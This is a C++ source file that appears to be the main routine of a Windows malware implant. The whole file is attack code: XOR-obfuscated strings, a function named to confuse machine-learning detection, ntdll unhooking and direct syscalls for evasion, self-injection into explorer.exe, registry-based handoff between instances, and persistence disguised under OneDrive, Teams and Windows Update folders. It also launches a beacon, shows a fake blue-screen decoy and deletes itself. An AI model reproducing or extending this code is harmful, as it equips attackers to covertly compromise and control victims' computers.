#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>

namespace {
    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
    std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";

    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";

    // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";

    void ConfuseML() {
        std::vector<int> v = {1, 5, 2, 8, 3};
        std::sort(v.begin(), v.end());
        volatile int sum = 0;
        for (int i : v) sum += i;
    }

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
        if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
        // "svchost.exe" -> \x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F
        if (sPath.find(utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F")) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
        if (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos) return true;
        if (sPath.find(L"\\microsoft\\teams\\") != std::wstring::npos) return true;
        if (sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) return true;
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    ConfuseML();
    Sleep(10000 + (GetTickCount() % 15000));

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (IsSystemProcess()) {
        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        bool ipcSuccess = false;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                ipcSuccess = true;
            }
            RegCloseKey(hKey);
        }

        if (ipcSuccess && dropperPath[0] != L'\0') {
            Sleep(60000 + (GetTickCount() % 60000));
            persistence::establishPersistence(dropperPath);
        }

        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    if (IsRunningFromPersistLocation()) {
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // Dropper instance
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }
    }

    // Fallback if injection fails
    persistence::establishPersistence();
    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
